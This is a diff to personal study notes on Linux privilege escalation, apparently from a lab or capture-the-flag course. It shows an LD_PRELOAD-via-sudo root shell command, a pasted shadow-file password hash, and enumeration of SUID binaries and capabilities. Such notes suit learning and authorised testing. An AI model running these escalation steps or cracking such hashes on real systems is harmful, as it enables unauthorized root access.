@@ -129,3 +129,20 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 -use this shared object file when launching any program the user can run with sudo
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 
+$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
+
+SUID
+-Linux privilege controls rely on controlling users and file interacions
+-achieved using permissions
+-SUID(set-user identification)
+-SGID(set-group identification)
+-'s'bit - special permission level
+'find / -type f -perm -04000 -ls 2>/dev/null': list files with SUID or SGID bit set
+
+Capabilities
+'getcap' tool  to list enabled capabilities
+-capabilites help manage privileges at a more granular level
+'getcap -r /' generates a lot of erros so it is good practice to redirect error messages to /dev/null
+'getcap -r / 2>/dev/null'
+
+
